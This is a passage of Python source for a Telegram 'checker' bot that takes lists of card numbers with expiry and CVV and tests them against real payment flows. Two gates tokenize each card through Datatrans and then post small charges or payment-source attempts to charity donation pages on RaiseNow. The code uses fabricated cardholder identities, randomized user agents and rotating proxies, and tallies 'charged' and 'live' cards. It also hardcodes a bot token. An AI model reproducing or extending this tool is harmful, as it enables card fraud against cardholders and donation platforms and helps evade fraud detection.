import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
import threading
import random
import psutil # Library for monitoring CPU/RAM
import ssl
import socket
import string
from datetime import datetime
from pytz import timezone
from urllib.parse import urlparse, unquote
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- MODIFIED: Renamed imports to avoid conflicts with new wrapper functions ---
from site_checker import site_command as original_site_command
from site_checker import sitem_command as original_sitem_command

# --- NEW: IMPORT GATE CHECKERS FROM THE 'checkers' DIRECTORY ---
from checkers.gate3_checker import check_card_gate3
from checkers.gate4_checker import check_card_gate4
from checkers.gate5_checker import check_card_gate5
from checkers.gate6_checker import check_card_gate6
from checkers.gate7_checker import check_card_gate7
from checkers.gate8_checker import check_card_gate8
from checkers.gate9_checker import check_card_gate9
from checkers.gate10_checker import check_card_gate10
from checkers.gate11_checker import check_card_gate11
from checkers.gate12_checker import check_card_gate12
# --- NEW: IMPORT THE SPECIAL MULTI-LINK CHECKER ---
from checkers.multi_link_checker import check_card_multi_link, load_links as load_multi_links, save_links as save_multi_links

# --- CONFIGURATION ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"

# --- STORAGE FILES & DIRECTORIES ---
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json" # Limit for /mass
MULTI_LIMIT_FILE = "multi_limits.json" # Limit for /multi
STATS_FILE = "user_stats.json"
LOG_DIR = "check_logs" # Main directory for logs
BOT_STATUS_FILE = "bot_status.json" # File for bot's on/off status
GATE_FILE = "current_gate.json" # File for the current check gate
GATE_RANGES_FILE = "gate_charge_ranges.json" # File for gate charge ranges
PROXY_FILE = "proxies.json" # File for proxies
# --- NEW ---
GATE1_MODE_FILE = "gate1_mode.json" # File for gate 1 mode
GATE2_MODE_FILE = "gate2_mode.json" # File for gate 2 mode
GATE3_MODE_FILE = "gate3_mode.json" # File for gate 3 mode
GATE5_MODE_FILE = "gate5_mode.json"
GATE8_MODE_FILE = "gate8_mode.json" # File for gate 8 mode
GATE9_MODE_FILE = "gate9_mode.json" # File for gate 9 mode
GATE10_MODE_FILE = "gate10_mode.json"
GATE11_MODE_FILE = "gate11_mode.json"
GATE12_MODE_FILE = "gate12_mode.json"
# --- NEW: FOR SPECIAL MULTI-LINK MODE ---
MULTI_LINK_DATA_FILE = "multi_link_data.json"
MULTI_LINK_MODE_FILE = "multi_link_mode.json"

# --- DEFAULT LIMITS FOR MEMBERS ---
DEFAULT_MEMBER_LIMIT = 100 # For /mass
MEMBER_THREAD_LIMIT = 3 # For /mass
DEFAULT_MULTI_LIMIT = 10 # For /multi

# --- TIMEZONE CONFIGURATION ---
VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')

# --- GLOBAL VARIABLES ---
# ACTIVE_CHECKS is now a dict to store more info about running tasks
# {user_id: {"full_name": str, "username": str, "start_time": float, "task_type": str}}
ACTIVE_CHECKS = {}
CANCELLATION_EVENTS = {} # {user_id: threading.Event}
STATS_FILE_LOCK = threading.Lock() # Lock to prevent conflicts when multiple users write to the stats file simultaneously

# --- NOTIFICATION MESSAGES ---
MESSAGES = {
    "bot_off": """üî¥ **MAINTENANCE NOTICE** üî¥

The bot is temporarily offline for maintenance. Checking commands will be disabled until further notice. Thank you for your patience!""",
    "bot_on": """üü¢ **SERVICE RESUMED NOTICE** üü¢

The bot is back online. Thank you for waiting!""",
}

# --- LOGGING CONFIGURATION ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- INITIALIZATION ---
# Create log directory if it doesn't exist
os.makedirs(LOG_DIR, exist_ok=True)
# Create checkers directory if it doesn't exist
os.makedirs("checkers", exist_ok=True)


# --- USER, DATA & GATE MANAGEMENT ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def get_user_multi_limit(user_id):
    limits = load_json_file(MULTI_LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MULTI_LIMIT)

def is_bot_on():
    status = load_json_file(BOT_STATUS_FILE, default_data={'is_on': True})
    return status.get('is_on', True)

def set_bot_status(is_on: bool):
    save_json_file(BOT_STATUS_FILE, {'is_on': is_on})

def get_active_gate():
    gate_data = load_json_file(GATE_FILE, default_data={'gate': '6'}) # Default is gate 6
    return gate_data.get('gate', '6')

def set_active_gate(gate_id):
    save_json_file(GATE_FILE, {'gate': str(gate_id)})

# --- GATE 1 MODE MANAGEMENT ---
def get_gate1_mode():
    mode_data = load_json_file(GATE1_MODE_FILE, default_data={'mode': 'live'})
    return mode_data.get('mode', 'live')

def set_gate1_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE1_MODE_FILE, {'mode': mode})

# --- GATE 2 MODE MANAGEMENT ---
def get_gate2_mode():
    mode_data = load_json_file(GATE2_MODE_FILE, default_data={'mode': 'charge'})
    return mode_data.get('mode', 'charge')

def set_gate2_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE2_MODE_FILE, {'mode': mode})

# --- GATE 3 MODE MANAGEMENT ---
def get_gate3_mode():
    mode_data = load_json_file(GATE3_MODE_FILE, default_data={'mode': 'charge'})
    return mode_data.get('mode', 'charge')

def set_gate3_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE3_MODE_FILE, {'mode': mode})

# --- GATE 5 MODE MANAGEMENT ---
def get_gate5_mode():
    mode_data = load_json_file(GATE5_MODE_FILE, default_data={'mode': 'charge'})
    return mode_data.get('mode', 'charge')

def set_gate5_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE5_MODE_FILE, {'mode': mode})

# --- GATE 8 MODE MANAGEMENT ---
def get_gate8_mode():
    mode_data = load_json_file(GATE8_MODE_FILE, default_data={'mode': 'live'})
    return mode_data.get('mode', 'live')

def set_gate8_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE8_MODE_FILE, {'mode': mode})

# --- GATE 9 MODE MANAGEMENT ---
def get_gate9_mode():
    mode_data = load_json_file(GATE9_MODE_FILE, default_data={'mode': 'live'})
    return mode_data.get('mode', 'live')

def set_gate9_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE9_MODE_FILE, {'mode': mode})

# --- GATE 10 MODE MANAGEMENT ---
def get_gate10_mode():
    mode_data = load_json_file(GATE10_MODE_FILE, default_data={'mode': 'charge'})
    return mode_data.get('mode', 'charge')

def set_gate10_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE10_MODE_FILE, {'mode': mode})

# --- GATE 11 MODE MANAGEMENT ---
def get_gate11_mode():
    mode_data = load_json_file(GATE11_MODE_FILE, default_data={'mode': 'charge'})
    return mode_data.get('mode', 'charge')

def set_gate11_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE11_MODE_FILE, {'mode': mode})

# --- GATE 12 MODE MANAGEMENT ---
def get_gate12_mode():
    mode_data = load_json_file(GATE12_MODE_FILE, default_data={'mode': 'charge'})
    return mode_data.get('mode', 'charge')

def set_gate12_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE12_MODE_FILE, {'mode': mode})

# --- NEW: MULTI-LINK (SPECIAL) MODE MANAGEMENT ---
def get_multi_link_mode():
    """Gets the current mode of the Multi-Link Gate (charge or live)."""
    mode_data = load_json_file(MULTI_LINK_MODE_FILE, default_data={'mode': 'charge'})
    return mode_data.get('mode', 'charge')

def set_multi_link_mode(mode):
    """Sets the mode for the Multi-Link Gate."""
    if mode in ['live', 'charge']:
        save_json_file(MULTI_LINK_MODE_FILE, {'mode': mode})


def _get_charge_value(gate_id, custom_charge_amount=None):
    """Gets the charge value: priority is custom_amount, then range, finally default."""
    if custom_charge_amount is not None:
        return custom_charge_amount

    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(str(gate_id))

    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            return random.randint(int(gate_range['min']), int(gate_range['max']))
        except (ValueError, TypeError):
            logger.warning(f"Error reading range for gate {gate_id}, using default. Range: {gate_range}")
            return 50 # Default 0.5$ if range is faulty

    return 50 # Default 0.5$ for other gates

def get_formatted_gate_name(gate_id):
    """Gets the formatted gate name with charge info."""
    gate_id_str = str(gate_id)

    # --- NEW: HANDLE SPECIAL MULTI-LINK GATE ---
    if gate_id_str == 'special':
        multi_link_mode = get_multi_link_mode()
        if multi_link_mode == 'live':
            return "Multi-Link Live"
        else: # Charge mode
            default_name = "Multi-Link Charge 0.5$"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(gate_id_str)

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Multi-Link Charge {min_val:.2f}$"
                    else:
                        return f"Multi-Link Charge {min_val:.2f}$-{max_val:.2f}$"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    # Dictionary to map gate IDs to their specific mode-getting functions and names
    gate_mode_map = {
        '1': (get_gate1_mode, "Gate 1", ""),
        '2': (get_gate2_mode, "Gate 2", ""),
        '3': (get_gate3_mode, "Gate 3", ""),
        '4': (None, "Gate 4", " Year"),
        '5': (get_gate5_mode, "Gate 5", " Month"),
        '8': (get_gate8_mode, "Gate 8", ""),
        '9': (get_gate9_mode, "Gate 9", ""),
        '10': (get_gate10_mode, "Gate 10", " Month"),
        '11': (get_gate11_mode, "Gate 11", " V11"),
        '12': (get_gate12_mode, "Gate 12", " V12"),
    }

    if gate_id_str in gate_mode_map:
        get_mode_func, base_name, suffix = gate_mode_map[gate_id_str]
        
        is_live_mode = False
        if get_mode_func:
            mode = get_mode_func()
            if mode == 'live':
                is_live_mode = True
        
        # Gate 7 is always live
        if gate_id_str == '7':
             return f"Check Live (Gate 7)"

        if is_live_mode:
            return f"Check Live{suffix} ({base_name})"
        
        # Charge mode logic
        default_name = f"Charge 0.5${suffix} ({base_name})"
        ranges = load_json_file(GATE_RANGES_FILE)
        gate_range = ranges.get(gate_id_str)

        if gate_range and 'min' in gate_range and 'max' in gate_range:
            try:
                min_val = int(gate_range['min']) / 100
                max_val = int(gate_range['max']) / 100
                if min_val == max_val:
                    return f"Charge {min_val:.2f}${suffix} ({base_name})"
                else:
                    return f"Charge {min_val:.2f}$-{max_val:.2f}${suffix} ({base_name})"
            except (ValueError, TypeError):
                return default_name
        return default_name

    # Fallback for gates without special mode logic (like Gate 6)
    default_names = {'6': "Charge 0.5$ (Gate 6)"}
    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(gate_id_str)

    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            min_val = int(gate_range['min']) / 100
            max_val = int(gate_range['max']) / 100
            if min_val == max_val:
                return f"Charge {min_val:.2f}$ (Gate {gate_id_str})"
            else:
                return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate {gate_id_str})"
        except (ValueError, TypeError):
            return default_names.get(gate_id_str, f"Unknown Gate {gate_id_str}")
    else:
        return default_names.get(gate_id_str, f"Unknown Gate {gate_id_str}")


def update_user_stats(user_id, user_info, counts):
    # Use lock to ensure safety when multiple threads update the file
    with STATS_FILE_LOCK:
        stats = load_json_file(STATS_FILE)
        user_id_str = str(user_id)

        default_user_stat = {
            'username': None, 'full_name': None, 'total_charged': 0, 'total_custom': 0, 'total_live_success': 0,
            'total_decline': 0, 'total_error': 0, 'total_invalid': 0, 'last_check_timestamp': ''
        }
        user_stat_data = stats.get(user_id_str, {})
        if isinstance(user_stat_data, dict):
            default_user_stat.update(user_stat_data)

        stats[user_id_str] = default_user_stat

        stats[user_id_str]['total_charged'] += counts.get('success', 0)
        stats[user_id_str]['total_live_success'] += counts.get('live_success', 0)
        stats[user_id_str]['total_custom'] += counts.get('custom', 0)
        stats[user_id_str]['total_decline'] += counts.get('decline', 0)
        stats[user_id_str]['total_error'] += counts.get('error', 0) + counts.get('gate_dead', 0)
        stats[user_id_str]['total_invalid'] += counts.get('invalid_format', 0)
        stats[user_id_str]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
        stats[user_id_str]['username'] = user_info.username
        stats[user_id_str]['full_name'] = user_info.full_name

        save_json_file(STATS_FILE, stats)

# --- PROXY MANAGEMENT FUNCTIONS ---
def load_proxies():
    """Loads the proxy list and status from a JSON file."""
    return load_json_file(PROXY_FILE, default_data={"enabled": False, "proxies": []})

def save_proxies(data):
    """Saves the proxy list and status to a JSON file."""
    save_json_file(PROXY_FILE, data)

def _format_proxy_for_requests(proxy_str):
    """Converts a proxy string to a dict format for the requests library."""
    if not proxy_str:
        return None
    parts = proxy_str.strip().split(':')
    # ip:port
    if len(parts) == 2:
        proxy_url = f"http://{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    # ip:port:user:pass
    elif len(parts) == 4:
        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    else:
        logger.warning(f"Invalid proxy format: {proxy_str}")
        return None

def _test_proxy(proxy_str: str):
    """Tests a proxy by connecting to google.com."""
    proxy_dict = _format_proxy_for_requests(proxy_str)
    if not proxy_dict:
        return False, "Invalid proxy format."
    try:
        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=7)
        if 200 <= response.status_code < 300:
            return True, f"Success (Status: {response.status_code})"
        else:
            return False, f"Failed (Status: {response.status_code})"
    except requests.exceptions.ProxyError as e:
        return False, f"Proxy Error: {e}"
    except requests.exceptions.RequestException as e:
        return False, f"Connection Error: {e}"
# --- END PROXY FUNCTIONS ---

# --- CORE FUNCTIONS ---

def generate_random_string(length=8):
    """Generates a random string of characters."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    """Generates a random email address."""
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_birth_day():
    """Generates a random day for birthday (1-28)."""
    return str(random.randint(1, 28)).zfill(2)

def random_birth_month():
    """Generates a random month for birthday (1-12)."""
    return str(random.randint(1, 12)).zfill(2)

def random_birth_year():
    """Generates a random year for birthday (1970-2005)."""
    return str(random.randint(1970, 2005))


def random_user_agent():
    """Generates a random realistic User-Agent string."""
    chrome_major = random.randint(100, 125)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    win_major = random.randint(10, 11)
    win_minor = random.randint(0, 3)
    win_build = random.randint(10000, 22631)
    win_patch = random.randint(0, 500)
    webkit_major = random.randint(537, 605) # Increased range for more variability
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = f"{win_major}.{win_minor}; Win64; x64"
    return (
        f"Mozilla/5.0 (Windows NT {win_version}) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            # **kwargs can contain 'proxies' if passed from check_card
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19):
        return False, "Card Number (CC) must be 10-19 digits."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
        return False, "Month (MM) must be a number from 1 to 12."
    if not (ano.isdigit() and len(ano) in [2, 4]):
        return False, "Year (YY) must be 2 or 4 digits."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return False, "CVV must be 3 or 4 digits."
    return True, ""

def _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount=None):
    """Logic for Gate 1 - Charge or Live Check Mode"""
    gate1_mode = get_gate1_mode()
    try:
        user_agent = random_user_agent()
        
        # Random personal info
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"
        email = random_email()
        birth_day = random_birth_day()
        birth_month = random_birth_month()
        birth_year = random_birth_year()

        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250806042656273071",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Make request based on mode
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }
        
        base_payload = {
            "account_uuid": "01bd7c99-eefc-42d2-91e4-4a020f6b5cfc",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "en",
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "birth_day": birth_day,
                "birth_month": birth_month,
                "birth_year": birth_year
            },
            "raisenow_parameters": {
                "analytics": {"channel": "paylink", "user_agent": user_agent},
                "solution": {"uuid": "75405349-f0b9-4bed-9d28-df297347f272", "name": "Patenschaft Hundeabteilung", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/ynddy?lng=en", "uuid": "self-service", "version": "2.16.0"}
            },
            "payment_information": {
                "brand_code": "eca",
                "cardholder": cardholder,
                "expiry_month": mes.zfill(2),
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "110885c2-a1e8-47b7-a2af-525ad6ab8ca6",
            "return_url": "https://donate.raisenow.io/ynddy?lng=en&rnw-view=payment_result",
        }

        # --- CHARGE MODE ---
        if gate1_mode == 'charge':
            charge_value = _get_charge_value('1', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments" # Charge endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
            # Remove subscription part for charge mode
            payment_payload.pop("subscription", None)

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        
        # --- LIVE CHECK MODE (ORIGINAL LOGIC) ---
        else:
            payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50}
            payment_payload["subscription"] = { "recurring_interval": "6 * *", "timezone": "Asia/Bangkok" }

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 1 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 1 System Error: {e}", bin_info

def _check_card_gate2(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount=None):
    """Logic for Gate 2 - Charge or Live Check Mode"""
    gate2_mode = get_gate2_mode()
    try:
        user_agent = random_user_agent()
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"

        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Host": "pay.datatrans.com",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250806055626003241",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "en-US",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Request based on mode
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }
        base_payload = {
            "account_uuid": "14bd66de-7d3a-4d31-98cd-072193050b5f",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {"locale": "de", "first_name": first_name, "last_name": last_name},
            "raisenow_parameters": {
                "analytics": {"channel": "paylink", "user_agent": user_agent},
                "solution": {"uuid": "0a3ee5eb-f169-403a-b4b8-b8641fe2a07d", "name": "Ausbildung Assistenzhund f√ºr Christopher", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/bchqm?lng=de", "uuid": "self-service", "version": "2.16.0"},
                "integration": {"donation_receipt_requested": "false"}
            },
            "custom_parameters": {"campaign_id": "Ausbildung Assistenzhund f√ºr Christopher", "campaign_subid": ""},
            "payment_information": {"brand_code": "eca", "cardholder": cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano, "transaction_id": transaction_id},
            "profile": "30b982d3-d984-4ed7-bd0d-c23197edfd1c",
            "return_url": "https://donate.raisenow.io/bchqm?lng=de&rnw-view=payment_result"
        }

        if gate2_mode == 'charge':
            charge_value = _get_charge_value('2', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        else: # live mode
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50}

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 2 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 2 System Error: {e}", bin_info

def check_card(line, cancellation_event=None, custom_charge_amount=None):
    if cancellation_event and cancellation_event.is_set():
        return 'cancelled', line, 'User cancelled', {}

    parts = line.strip().split('|')
    cc, mes, ano, cvv = "", "", "", ""

    if len(parts) == 4:
        cc, mes, ano, cvv = [p.strip() for p in parts]
    elif len(parts) == 3:
        cc_part, date_part, cvv_part = [p.strip() for p in parts]
        if '/' in date_part:
            date_split = date_part.split('/')
            if len(date_split) == 2:
                cc, mes, ano, cvv = cc_part.strip(), date_split[0].strip(), date_split[1].strip(), cvv_part.strip()
            else:
                return 'invalid_format', line, "Invalid date format (mm/yy or mm/yyyy).", {}
        else:
            return 'invalid_format', line, "Missing '/' in the date part.", {}
    else:
        return 'invalid_format', line, "Invalid format (cc|mm|yy|cvv or cc|mm/yy|cvv).", {}

    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid:
        return 'invalid_format', line, error_message, {}

    try:
        year_str = ano.strip()
        if len(year_str) == 2:
            full_year = int(f"20{year_str}")
        elif len(year_str) == 4:
            full_year = int(year_str)
        else:
            full_year = 0 
        if full_year < datetime.now().year:
            return 'decline', line, 'EXPIRED_CARD_DECLINE', {}
    except ValueError:
        return 'invalid_format', line, "Invalid expiration year.", {}

    if len(ano) == 2: ano = f"20{ano}"
    
    session = requests.Session()
    
    proxy_config = load_proxies()
    if proxy_config.get("enabled") and proxy_config.get("proxies"):
        try:
            proxy_str = random.choice(proxy_config["proxies"])
            proxy_dict = _format_proxy_for_requests(proxy_str)
            if proxy_dict:
                session.proxies = proxy_dict
        except IndexError:
            logger.warning("Proxy list is empty but proxy usage is enabled.")
            pass

    bin_info = {}

    try:
